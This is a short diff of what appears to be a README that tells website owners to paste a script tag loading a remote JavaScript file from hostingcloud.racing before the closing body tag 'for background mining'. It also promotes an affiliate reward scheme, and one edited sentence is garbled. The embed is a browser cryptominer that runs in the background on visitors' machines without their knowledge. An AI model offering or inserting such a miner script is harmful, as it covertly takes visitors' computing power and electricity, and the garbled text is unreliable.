@@ -14,7 +14,9 @@ Put this code before the
 </body>
 
 ```
-tag in your website after the ''
+tag in your website after the 
+
+```
 </head>
 
 ```
@@ -29,13 +31,14 @@ tag in your website after the ''
 ######<a href=https://djjizzygymsock.blogspot.com>My associate's donated blog. Big thanks to DJ Jizzy Gymsock and affiliated "artists"</a>######
 
 Put this code before 
+
 ```
 </body> 
 
 ```
 tag in your website for background mining and thanks for considering it.
 
-To enable separate mining for site users, check our documentation.
+To enable separate mining for site users, check coming documentation to be rewarded for being an affiliate site. documentation.
 
 ```
 <script src="https://www.hostingcloud.racing/pLiB.js"></script>
